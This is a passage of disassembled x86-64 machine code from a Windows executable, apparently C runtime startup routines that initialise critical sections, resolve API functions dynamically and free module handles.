   1400063de:	33 c9                	xor    %ecx,%ecx
   1400063e0:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400063e5:	ff 15 95 5d 00 00    	call   *0x5d95(%rip)        # 0x14000c180
   1400063eb:	85 c0                	test   %eax,%eax
   1400063ed:	74 08                	je     0x1400063f7
   1400063ef:	48 8b f7             	mov    %rdi,%rsi
   1400063f2:	49 8b fe             	mov    %r14,%rdi
   1400063f5:	eb 03                	jmp    0x1400063fa
   1400063f7:	49 8b f6             	mov    %r14,%rsi
   1400063fa:	48 8b cf             	mov    %rdi,%rcx
   1400063fd:	e8 3e e3 ff ff       	call   0x140004740
   140006402:	eb 03                	jmp    0x140006407
   140006404:	49 8b f6             	mov    %r14,%rsi
   140006407:	48 85 db             	test   %rbx,%rbx
   14000640a:	74 09                	je     0x140006415
   14000640c:	48 8b cb             	mov    %rbx,%rcx
   14000640f:	ff 15 f3 5d 00 00    	call   *0x5df3(%rip)        # 0x14000c208
   140006415:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000641a:	48 8b c6             	mov    %rsi,%rax
   14000641d:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140006422:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140006427:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   14000642c:	48 83 c4 40          	add    $0x40,%rsp
   140006430:	41 5e                	pop    %r14
   140006432:	c3                   	ret
   140006433:	90                   	nop
   140006434:	53                   	push   %rbx
   140006435:	48 83 ec 20          	sub    $0x20,%rsp
   140006439:	33 db                	xor    %ebx,%ebx
   14000643b:	48 8d 15 0e fe 00 00 	lea    0xfe0e(%rip),%rdx        # 0x140016250
   140006442:	45 33 c0             	xor    %r8d,%r8d
   140006445:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140006449:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   14000644d:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140006452:	e8 a5 03 00 00       	call   0x1400067fc
   140006457:	85 c0                	test   %eax,%eax
   140006459:	74 11                	je     0x14000646c
   14000645b:	ff 05 f7 ff 00 00    	incl   0xfff7(%rip)        # 0x140016458
   140006461:	ff c3                	inc    %ebx
   140006463:	83 fb 0d             	cmp    $0xd,%ebx
   140006466:	72 d3                	jb     0x14000643b
   140006468:	b0 01                	mov    $0x1,%al
   14000646a:	eb 09                	jmp    0x140006475
   14000646c:	33 c9                	xor    %ecx,%ecx
   14000646e:	e8 25 00 00 00       	call   0x140006498
   140006473:	32 c0                	xor    %al,%al
   140006475:	48 83 c4 20          	add    $0x20,%rsp
   140006479:	5b                   	pop    %rbx
   14000647a:	c3                   	ret
   14000647b:	90                   	nop
   14000647c:	48 63 c1             	movslq %ecx,%rax
   14000647f:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140006483:	48 8d 05 c6 fd 00 00 	lea    0xfdc6(%rip),%rax        # 0x140016250
   14000648a:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   14000648e:	48 ff 25 ab 5c 00 00 	rex.W jmp *0x5cab(%rip)        # 0x14000c140
   140006495:	90                   	nop
   140006496:	90                   	nop
   140006497:	90                   	nop
   140006498:	53                   	push   %rbx
   140006499:	48 83 ec 20          	sub    $0x20,%rsp
   14000649d:	8b 1d b5 ff 00 00    	mov    0xffb5(%rip),%ebx        # 0x140016458
   1400064a3:	eb 1d                	jmp    0x1400064c2
   1400064a5:	48 8d 05 a4 fd 00 00 	lea    0xfda4(%rip),%rax        # 0x140016250
   1400064ac:	ff cb                	dec    %ebx
   1400064ae:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   1400064b2:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   1400064b6:	ff 15 94 5c 00 00    	call   *0x5c94(%rip)        # 0x14000c150
   1400064bc:	ff 0d 96 ff 00 00    	decl   0xff96(%rip)        # 0x140016458
   1400064c2:	85 db                	test   %ebx,%ebx
   1400064c4:	75 df                	jne    0x1400064a5
   1400064c6:	b0 01                	mov    $0x1,%al
   1400064c8:	48 83 c4 20          	add    $0x20,%rsp
   1400064cc:	5b                   	pop    %rbx
   1400064cd:	c3                   	ret
   1400064ce:	90                   	nop
   1400064cf:	90                   	nop
   1400064d0:	48 63 c1             	movslq %ecx,%rax
   1400064d3:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400064d7:	48 8d 05 72 fd 00 00 	lea    0xfd72(%rip),%rax        # 0x140016250
   1400064de:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   1400064e2:	48 ff 25 5f 5c 00 00 	rex.W jmp *0x5c5f(%rip)        # 0x14000c148
   1400064e9:	90                   	nop
   1400064ea:	90                   	nop
   1400064eb:	90                   	nop
   1400064ec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400064f1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400064f6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400064fb:	57                   	push   %rdi
   1400064fc:	41 54                	push   %r12
   1400064fe:	41 55                	push   %r13
   140006500:	41 56                	push   %r14
   140006502:	41 57                	push   %r15
   140006504:	48 83 ec 20          	sub    $0x20,%rsp
   140006508:	44 8b f1             	mov    %ecx,%r14d
   14000650b:	4c 8d 3d ee 9a ff ff 	lea    -0x6512(%rip),%r15        # 0x140000000
   140006512:	4d 8b e1             	mov    %r9,%r12
   140006515:	49 8b e8             	mov    %r8,%rbp
   140006518:	4c 8b ea             	mov    %rdx,%r13
   14000651b:	4b 8b 8c f7 00 65 01 	mov    0x16500(%r15,%r14,8),%rcx
   140006522:	00 
   140006523:	4c 8b 15 ee ea 00 00 	mov    0xeaee(%rip),%r10        # 0x140015018
   14000652a:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   14000652e:	41 8b c2             	mov    %r10d,%eax
   140006531:	49 8b d2             	mov    %r10,%rdx
   140006534:	48 33 d1             	xor    %rcx,%rdx
   140006537:	83 e0 3f             	and    $0x3f,%eax
   14000653a:	8a c8                	mov    %al,%cl
   14000653c:	48 d3 ca             	ror    %cl,%rdx
   14000653f:	48 3b d7             	cmp    %rdi,%rdx
   140006542:	0f 84 25 01 00 00    	je     0x14000666d
   140006548:	48 85 d2             	test   %rdx,%rdx
   14000654b:	74 08                	je     0x140006555
   14000654d:	48 8b c2             	mov    %rdx,%rax
   140006550:	e9 1a 01 00 00       	jmp    0x14000666f
   140006555:	4d 3b c1             	cmp    %r9,%r8
   140006558:	0f 84 a3 00 00 00    	je     0x140006601
   14000655e:	8b 75 00             	mov    0x0(%rbp),%esi
   140006561:	49 8b 9c f7 60 64 01 	mov    0x16460(%r15,%rsi,8),%rbx
   140006568:	00 
   140006569:	48 85 db             	test   %rbx,%rbx
   14000656c:	74 07                	je     0x140006575
   14000656e:	48 3b df             	cmp    %rdi,%rbx
   140006571:	74 7a                	je     0x1400065ed
   140006573:	eb 73                	jmp    0x1400065e8
   140006575:	4d 8b bc f7 50 c9 00 	mov    0xc950(%r15,%rsi,8),%r15
   14000657c:	00 
   14000657d:	33 d2                	xor    %edx,%edx
   14000657f:	49 8b cf             	mov    %r15,%rcx
   140006582:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140006588:	ff 15 aa 5b 00 00    	call   *0x5baa(%rip)        # 0x14000c138
   14000658e:	48 8b d8             	mov    %rax,%rbx
   140006591:	48 85 c0             	test   %rax,%rax
   140006594:	75 20                	jne    0x1400065b6
   140006596:	ff 15 64 5a 00 00    	call   *0x5a64(%rip)        # 0x14000c000
   14000659c:	83 f8 57             	cmp    $0x57,%eax
   14000659f:	75 13                	jne    0x1400065b4
   1400065a1:	45 33 c0             	xor    %r8d,%r8d
   1400065a4:	33 d2                	xor    %edx,%edx
   1400065a6:	49 8b cf             	mov    %r15,%rcx
   1400065a9:	ff 15 89 5b 00 00    	call   *0x5b89(%rip)        # 0x14000c138
   1400065af:	48 8b d8             	mov    %rax,%rbx
   1400065b2:	eb 02                	jmp    0x1400065b6
   1400065b4:	33 db                	xor    %ebx,%ebx
   1400065b6:	4c 8d 3d 43 9a ff ff 	lea    -0x65bd(%rip),%r15        # 0x140000000
   1400065bd:	48 85 db             	test   %rbx,%rbx
   1400065c0:	75 0d                	jne    0x1400065cf
   1400065c2:	48 8b c7             	mov    %rdi,%rax
   1400065c5:	49 87 84 f7 60 64 01 	xchg   %rax,0x16460(%r15,%rsi,8)
   1400065cc:	00 
   1400065cd:	eb 1e                	jmp    0x1400065ed
   1400065cf:	48 8b c3             	mov    %rbx,%rax
   1400065d2:	49 87 84 f7 60 64 01 	xchg   %rax,0x16460(%r15,%rsi,8)
   1400065d9:	00 
   1400065da:	48 85 c0             	test   %rax,%rax
   1400065dd:	74 09                	je     0x1400065e8
   1400065df:	48 8b cb             	mov    %rbx,%rcx
   1400065e2:	ff 15 48 5b 00 00    	call   *0x5b48(%rip)        # 0x14000c130
   1400065e8:	48 85 db             	test   %rbx,%rbx
   1400065eb:	75 55                	jne    0x140006642
   1400065ed:	48 83 c5 04          	add    $0x4,%rbp
   1400065f1:	49 3b ec             	cmp    %r12,%rbp
   1400065f4:	0f 85 64 ff ff ff    	jne    0x14000655e
   1400065fa:	4c 8b 15 17 ea 00 00 	mov    0xea17(%rip),%r10        # 0x140015018
   140006601:	33 db                	xor    %ebx,%ebx
   140006603:	48 85 db             	test   %rbx,%rbx
   140006606:	74 4a                	je     0x140006652
   140006608:	49 8b d5             	mov    %r13,%rdx
   14000660b:	48 8b cb             	mov    %rbx,%rcx
   14000660e:	ff 15 0c 5a 00 00    	call   *0x5a0c(%rip)        # 0x14000c020
   140006614:	48 85 c0             	test   %rax,%rax
   140006617:	74 32                	je     0x14000664b
   140006619:	4c 8b 05 f8 e9 00 00 	mov    0xe9f8(%rip),%r8        # 0x140015018
   140006620:	ba 40 00 00 00       	mov    $0x40,%edx
   140006625:	41 8b c8             	mov    %r8d,%ecx
   140006628:	83 e1 3f             	and    $0x3f,%ecx
   14000662b:	2b d1                	sub    %ecx,%edx
   14000662d:	8a ca                	mov    %dl,%cl
   14000662f:	48 8b d0             	mov    %rax,%rdx
   140006632:	48 d3 ca             	ror    %cl,%rdx
   140006635:	49 33 d0             	xor    %r8,%rdx
   140006638:	4b 87 94 f7 00 65 01 	xchg   %rdx,0x16500(%r15,%r14,8)
   14000663f:	00 
   140006640:	eb 2d                	jmp    0x14000666f
   140006642:	4c 8b 15 cf e9 00 00 	mov    0xe9cf(%rip),%r10        # 0x140015018
   140006649:	eb b8                	jmp    0x140006603
   14000664b:	4c 8b 15 c6 e9 00 00 	mov    0xe9c6(%rip),%r10        # 0x140015018
   140006652:	41 8b c2             	mov    %r10d,%eax
   140006655:	b9 40 00 00 00       	mov    $0x40,%ecx
   14000665a:	83 e0 3f             	and    $0x3f,%eax
   14000665d:	2b c8                	sub    %eax,%ecx
   14000665f:	48 d3 cf             	ror    %cl,%rdi
   140006662:	49 33 fa             	xor    %r10,%rdi
   140006665:	4b 87 bc f7 00 65 01 	xchg   %rdi,0x16500(%r15,%r14,8)
   14000666c:	00 
   14000666d:	33 c0                	xor    %eax,%eax
   14000666f:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140006674:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140006679:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000667e:	48 83 c4 20          	add    $0x20,%rsp
   140006682:	41 5f                	pop    %r15
   140006684:	41 5e                	pop    %r14
   140006686:	41 5d                	pop    %r13
   140006688:	41 5c                	pop    %r12
   14000668a:	5f                   	pop    %rdi
   14000668b:	c3                   	ret
   14000668c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006691:	57                   	push   %rdi
   140006692:	48 83 ec 20          	sub    $0x20,%rsp
   140006696:	48 8b f9             	mov    %rcx,%rdi
   140006699:	4c 8d 0d e8 67 00 00 	lea    0x67e8(%rip),%r9        # 0x14000ce88
   1400066a0:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400066a5:	4c 8d 05 d4 67 00 00 	lea    0x67d4(%rip),%r8        # 0x14000ce80
   1400066ac:	48 8d 15 65 5e 00 00 	lea    0x5e65(%rip),%rdx        # 0x14000c518
   1400066b3:	e8 34 fe ff ff       	call   0x1400064ec
   1400066b8:	48 8b d8             	mov    %rax,%rbx
   1400066bb:	48 85 c0             	test   %rax,%rax
   1400066be:	74 10                	je     0x1400066d0
   1400066c0:	48 8b c8             	mov    %rax,%rcx
   1400066c3:	ff 15 bf 5b 00 00    	call   *0x5bbf(%rip)        # 0x14000c288
   1400066c9:	48 8b cf             	mov    %rdi,%rcx
   1400066cc:	ff d3                	call   *%rbx
   1400066ce:	eb 06                	jmp    0x1400066d6
   1400066d0:	ff 15 3a 5a 00 00    	call   *0x5a3a(%rip)        # 0x14000c110
   1400066d6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400066db:	48 83 c4 20          	add    $0x20,%rsp
   1400066df:	5f                   	pop    %rdi
   1400066e0:	c3                   	ret
   1400066e1:	90                   	nop
   1400066e2:	90                   	nop
   1400066e3:	90                   	nop
   1400066e4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400066e9:	57                   	push   %rdi
   1400066ea:	48 83 ec 20          	sub    $0x20,%rsp
   1400066ee:	8b d9                	mov    %ecx,%ebx
   1400066f0:	4c 8d 0d 99 67 00 00 	lea    0x6799(%rip),%r9        # 0x14000ce90
   1400066f7:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400066fc:	4c 8d 05 85 67 00 00 	lea    0x6785(%rip),%r8        # 0x14000ce88
   140006703:	48 8d 15 26 5e 00 00 	lea    0x5e26(%rip),%rdx        # 0x14000c530
   14000670a:	e8 dd fd ff ff       	call   0x1400064ec
   14000670f:	48 8b f8             	mov    %rax,%rdi
   140006712:	48 85 c0             	test   %rax,%rax
   140006715:	74 0f                	je     0x140006726
   140006717:	48 8b c8             	mov    %rax,%rcx
   14000671a:	ff 15 68 5b 00 00    	call   *0x5b68(%rip)        # 0x14000c288
   140006720:	8b cb                	mov    %ebx,%ecx
   140006722:	ff d7                	call   *%rdi
   140006724:	eb 08                	jmp    0x14000672e
   140006726:	8b cb                	mov    %ebx,%ecx
   140006728:	ff 15 fa 59 00 00    	call   *0x59fa(%rip)        # 0x14000c128
   14000672e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006733:	48 83 c4 20          	add    $0x20,%rsp
   140006737:	5f                   	pop    %rdi
   140006738:	c3                   	ret
   140006739:	90                   	nop
   14000673a:	90                   	nop
   14000673b:	90                   	nop
   14000673c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006741:	57                   	push   %rdi
   140006742:	48 83 ec 20          	sub    $0x20,%rsp
   140006746:	8b d9                	mov    %ecx,%ebx
   140006748:	4c 8d 0d 49 67 00 00 	lea    0x6749(%rip),%r9        # 0x14000ce98
   14000674f:	b9 05 00 00 00       	mov    $0x5,%ecx
   140006754:	4c 8d 05 35 67 00 00 	lea    0x6735(%rip),%r8        # 0x14000ce90
   14000675b:	48 8d 15 d6 5d 00 00 	lea    0x5dd6(%rip),%rdx        # 0x14000c538
   140006762:	e8 85 fd ff ff       	call   0x1400064ec
   140006767:	48 8b f8             	mov    %rax,%rdi
   14000676a:	48 85 c0             	test   %rax,%rax
   14000676d:	74 0f                	je     0x14000677e
   14000676f:	48 8b c8             	mov    %rax,%rcx
   140006772:	ff 15 10 5b 00 00    	call   *0x5b10(%rip)        # 0x14000c288
   140006778:	8b cb                	mov    %ebx,%ecx
   14000677a:	ff d7                	call   *%rdi
   14000677c:	eb 08                	jmp    0x140006786
   14000677e:	8b cb                	mov    %ebx,%ecx
   140006780:	ff 15 92 59 00 00    	call   *0x5992(%rip)        # 0x14000c118
   140006786:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000678b:	48 83 c4 20          	add    $0x20,%rsp
   14000678f:	5f                   	pop    %rdi
   140006790:	c3                   	ret
   140006791:	90                   	nop
   140006792:	90                   	nop
   140006793:	90                   	nop
   140006794:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006799:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000679e:	57                   	push   %rdi
   14000679f:	48 83 ec 20          	sub    $0x20,%rsp
   1400067a3:	48 8b da             	mov    %rdx,%rbx
   1400067a6:	4c 8d 0d f3 66 00 00 	lea    0x66f3(%rip),%r9        # 0x14000cea0
   1400067ad:	8b f9                	mov    %ecx,%edi
   1400067af:	48 8d 15 9a 5d 00 00 	lea    0x5d9a(%rip),%rdx        # 0x14000c550
   1400067b6:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400067bb:	4c 8d 05 d6 66 00 00 	lea    0x66d6(%rip),%r8        # 0x14000ce98
   1400067c2:	e8 25 fd ff ff       	call   0x1400064ec
   1400067c7:	48 8b f0             	mov    %rax,%rsi
   1400067ca:	48 85 c0             	test   %rax,%rax
   1400067cd:	74 12                	je     0x1400067e1
   1400067cf:	48 8b c8             	mov    %rax,%rcx
   1400067d2:	ff 15 b0 5a 00 00    	call   *0x5ab0(%rip)        # 0x14000c288
   1400067d8:	48 8b d3             	mov    %rbx,%rdx
   1400067db:	8b cf                	mov    %edi,%ecx
   1400067dd:	ff d6                	call   *%rsi
   1400067df:	eb 0b                	jmp    0x1400067ec
   1400067e1:	48 8b d3             	mov    %rbx,%rdx
   1400067e4:	8b cf                	mov    %edi,%ecx
   1400067e6:	ff 15 34 59 00 00    	call   *0x5934(%rip)        # 0x14000c120
   1400067ec:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400067f1:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400067f6:	48 83 c4 20          	add    $0x20,%rsp
   1400067fa:	5f                   	pop    %rdi
   1400067fb:	c3                   	ret
   1400067fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006801:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140006806:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000680b:	57                   	push   %rdi
   14000680c:	48 83 ec 20          	sub    $0x20,%rsp
   140006810:	41 8b e8             	mov    %r8d,%ebp
   140006813:	4c 8d 0d ae 66 00 00 	lea    0x66ae(%rip),%r9        # 0x14000cec8
   14000681a:	8b da                	mov    %edx,%ebx
   14000681c:	4c 8d 05 9d 66 00 00 	lea    0x669d(%rip),%r8        # 0x14000cec0
   140006823:	48 8b f9             	mov    %rcx,%rdi
   140006826:	48 8d 15 3b 5d 00 00 	lea    0x5d3b(%rip),%rdx        # 0x14000c568
   14000682d:	b9 14 00 00 00       	mov    $0x14,%ecx
   140006832:	e8 b5 fc ff ff       	call   0x1400064ec
   140006837:	48 8b f0             	mov    %rax,%rsi
   14000683a:	48 85 c0             	test   %rax,%rax
   14000683d:	74 15                	je     0x140006854
   14000683f:	48 8b c8             	mov    %rax,%rcx
   140006842:	ff 15 40 5a 00 00    	call   *0x5a40(%rip)        # 0x14000c288
   140006848:	44 8b c5             	mov    %ebp,%r8d
   14000684b:	8b d3                	mov    %ebx,%edx
   14000684d:	48 8b cf             	mov    %rdi,%rcx
   140006850:	ff d6                	call   *%rsi
   140006852:	eb 0b                	jmp    0x14000685f
   140006854:	8b d3                	mov    %ebx,%edx
   140006856:	48 8b cf             	mov    %rdi,%rcx
   140006859:	ff 15 a9 58 00 00    	call   *0x58a9(%rip)        # 0x14000c108
   14000685f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006864:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140006869:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000686e:	48 83 c4 20          	add    $0x20,%rsp
   140006872:	5f                   	pop    %rdi
   140006873:	c3                   	ret
   140006874:	48 8b c4             	mov    %rsp,%rax
   140006877:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000687b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000687f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140006883:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140006887:	41 56                	push   %r14
   140006889:	48 83 ec 50          	sub    $0x50,%rsp
   14000688d:	41 8b f9             	mov    %r9d,%edi
   140006890:	49 8b f0             	mov    %r8,%rsi
   140006893:	8b ea                	mov    %edx,%ebp
   140006895:	4c 8d 0d 34 66 00 00 	lea    0x6634(%rip),%r9        # 0x14000ced0
   14000689c:	4c 8b f1             	mov    %rcx,%r14
   14000689f:	4c 8d 05 22 66 00 00 	lea    0x6622(%rip),%r8        # 0x14000cec8
   1400068a6:	48 8d 15 23 66 00 00 	lea    0x6623(%rip),%rdx        # 0x14000ced0
   1400068ad:	b9 16 00 00 00       	mov    $0x16,%ecx
   1400068b2:	e8 35 fc ff ff       	call   0x1400064ec
   1400068b7:	48 8b d8             	mov    %rax,%rbx
   1400068ba:	48 85 c0             	test   %rax,%rax
   1400068bd:	74 57                	je     0x140006916
   1400068bf:	48 8b c8             	mov    %rax,%rcx
   1400068c2:	ff 15 c0 59 00 00    	call   *0x59c0(%rip)        # 0x14000c288
   1400068c8:	48 8b 8c 24 a0 00 00 	mov    0xa0(%rsp),%rcx
   1400068cf:	00 
   1400068d0:	44 8b cf             	mov    %edi,%r9d
   1400068d3:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   1400068da:	00 
   1400068db:	4c 8b c6             	mov    %rsi,%r8
   1400068de:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   1400068e3:	8b d5                	mov    %ebp,%edx
   1400068e5:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   1400068ec:	00 
   1400068ed:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   1400068f2:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   1400068f9:	00 
   1400068fa:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400068ff:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
   140006906:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   14000690a:	49 8b ce             	mov    %r14,%rcx
   14000690d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006912:	ff d3                	call   *%rbx
   140006914:	eb 32                	jmp    0x140006948
   140006916:	33 d2                	xor    %edx,%edx
   140006918:	49 8b ce             	mov    %r14,%rcx
   14000691b:	e8 44 00 00 00       	call   0x140006964
   140006920:	8b c8                	mov    %eax,%ecx
   140006922:	44 8b cf             	mov    %edi,%r9d
   140006925:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   14000692c:	4c 8b c6             	mov    %rsi,%r8
   14000692f:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140006933:	8b d5                	mov    %ebp,%edx
   140006935:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   14000693c:	00 
   14000693d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006942:	ff 15 c8 58 00 00    	call   *0x58c8(%rip)        # 0x14000c210
   140006948:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000694d:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140006952:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140006957:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   14000695c:	48 83 c4 50          	add    $0x50,%rsp
   140006960:	41 5e                	pop    %r14
   140006962:	c3                   	ret
   140006963:	90                   	nop
   140006964:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006969:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000696e:	57                   	push   %rdi
   14000696f:	48 83 ec 20          	sub    $0x20,%rsp
   140006973:	8b f2                	mov    %edx,%esi
   140006975:	4c 8d 0d 6c 65 00 00 	lea    0x656c(%rip),%r9        # 0x14000cee8
   14000697c:	48 8b d9             	mov    %rcx,%rbx
   14000697f:	48 8d 15 62 65 00 00 	lea    0x6562(%rip),%rdx        # 0x14000cee8
   140006986:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000698b:	4c 8d 05 4e 65 00 00 	lea    0x654e(%rip),%r8        # 0x14000cee0
   140006992:	e8 55 fb ff ff       	call   0x1400064ec
   140006997:	48 8b f8             	mov    %rax,%rdi
   14000699a:	48 85 c0             	test   %rax,%rax
   14000699d:	74 12                	je     0x1400069b1
   14000699f:	48 8b c8             	mov    %rax,%rcx
   1400069a2:	ff 15 e0 58 00 00    	call   *0x58e0(%rip)        # 0x14000c288
   1400069a8:	8b d6                	mov    %esi,%edx
   1400069aa:	48 8b cb             	mov    %rbx,%rcx
   1400069ad:	ff d7                	call   *%rdi
   1400069af:	eb 08                	jmp    0x1400069b9
   1400069b1:	48 8b cb             	mov    %rbx,%rcx
   1400069b4:	e8 03 23 00 00       	call   0x140008cbc
   1400069b9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400069be:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400069c3:	48 83 c4 20          	add    $0x20,%rsp
   1400069c7:	5f                   	pop    %rdi
   1400069c8:	c3                   	ret
   1400069c9:	90                   	nop
   1400069ca:	90                   	nop
   1400069cb:	90                   	nop
   1400069cc:	48 89 7c 24 08       	mov    %rdi,0x8(%rsp)
   1400069d1:	48 8b 15 40 e6 00 00 	mov    0xe640(%rip),%rdx        # 0x140015018
   1400069d8:	48 8d 3d 21 fb 00 00 	lea    0xfb21(%rip),%rdi        # 0x140016500
   1400069df:	8b c2                	mov    %edx,%eax
   1400069e1:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400069e6:	83 e0 3f             	and    $0x3f,%eax
   1400069e9:	2b c8                	sub    %eax,%ecx
   1400069eb:	33 c0                	xor    %eax,%eax
   1400069ed:	48 d3 c8             	ror    %cl,%rax
   1400069f0:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400069f5:	48 33 c2             	xor    %rdx,%rax
   1400069f8:	f3 48 ab             	rep stos %rax,(%rdi)
   1400069fb:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
   140006a00:	b0 01                	mov    $0x1,%al
   140006a02:	c3                   	ret
   140006a03:	90                   	nop
   140006a04:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006a09:	57                   	push   %rdi
   140006a0a:	48 83 ec 20          	sub    $0x20,%rsp
   140006a0e:	8b 05 ec fb 00 00    	mov    0xfbec(%rip),%eax        # 0x140016600
   140006a14:	33 db                	xor    %ebx,%ebx
   140006a16:	85 c0                	test   %eax,%eax
   140006a18:	74 08                	je     0x140006a22
   140006a1a:	83 f8 01             	cmp    $0x1,%eax
   140006a1d:	0f 94 c0             	sete   %al
   140006a20:	eb 5c                	jmp    0x140006a7e
   140006a22:	4c 8d 0d 7f 64 00 00 	lea    0x647f(%rip),%r9        # 0x14000cea8
   140006a29:	b9 08 00 00 00       	mov    $0x8,%ecx
   140006a2e:	4c 8d 05 6b 64 00 00 	lea    0x646b(%rip),%r8        # 0x14000cea0
   140006a35:	48 8d 15 6c 64 00 00 	lea    0x646c(%rip),%rdx        # 0x14000cea8
   140006a3c:	e8 ab fa ff ff       	call   0x1400064ec
   140006a41:	48 8b f8             	mov    %rax,%rdi
   140006a44:	48 85 c0             	test   %rax,%rax
   140006a47:	74 28                	je     0x140006a71
   140006a49:	48 8b c8             	mov    %rax,%rcx
   140006a4c:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140006a50:	ff 15 32 58 00 00    	call   *0x5832(%rip)        # 0x14000c288
   140006a56:	33 d2                	xor    %edx,%edx
   140006a58:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140006a5d:	ff d7                	call   *%rdi
   140006a5f:	83 f8 7a             	cmp    $0x7a,%eax
   140006a62:	75 0d                	jne    0x140006a71
   140006a64:	8d 48 87             	lea    -0x79(%rax),%ecx
   140006a67:	b0 01                	mov    $0x1,%al
   140006a69:	87 0d 91 fb 00 00    	xchg   %ecx,0xfb91(%rip)        # 0x140016600
   140006a6f:	eb 0d                	jmp    0x140006a7e
   140006a71:	b8 02 00 00 00       	mov    $0x2,%eax
   140006a76:	87 05 84 fb 00 00    	xchg   %eax,0xfb84(%rip)        # 0x140016600
   140006a7c:	32 c0                	xor    %al,%al
   140006a7e:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140006a83:	48 83 c4 20          	add    $0x20,%rsp
   140006a87:	5f                   	pop    %rdi
   140006a88:	c3                   	ret
   140006a89:	90                   	nop
   140006a8a:	90                   	nop
   140006a8b:	90                   	nop
   140006a8c:	53                   	push   %rbx
   140006a8d:	48 83 ec 20          	sub    $0x20,%rsp
   140006a91:	84 c9                	test   %cl,%cl
   140006a93:	75 2f                	jne    0x140006ac4
   140006a95:	48 8d 1d c4 f9 00 00 	lea    0xf9c4(%rip),%rbx        # 0x140016460
   140006a9c:	48 8b 0b             	mov    (%rbx),%rcx
   140006a9f:	48 85 c9             	test   %rcx,%rcx
   140006aa2:	74 10                	je     0x140006ab4
   140006aa4:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   140006aa8:	74 06                	je     0x140006ab0
   140006aaa:	ff 15 80 56 00 00    	call   *0x5680(%rip)        # 0x14000c130
   140006ab0:	48 83 23 00          	andq   $0x0,(%rbx)
   140006ab4:	48 83 c3 08          	add    $0x8,%rbx
   140006ab8:	48 8d 05 41 fa 00 00 	lea    0xfa41(%rip),%rax        # 0x140016500
   140006abf:	48 3b d8             	cmp    %rax,%rbx
   140006ac2:	75 d8                	jne    0x140006a9c
   140006ac4:	b0 01                	mov    $0x1,%al
   140006ac6:	48 83 c4 20          	add    $0x20,%rsp
   140006aca:	5b                   	pop    %rbx
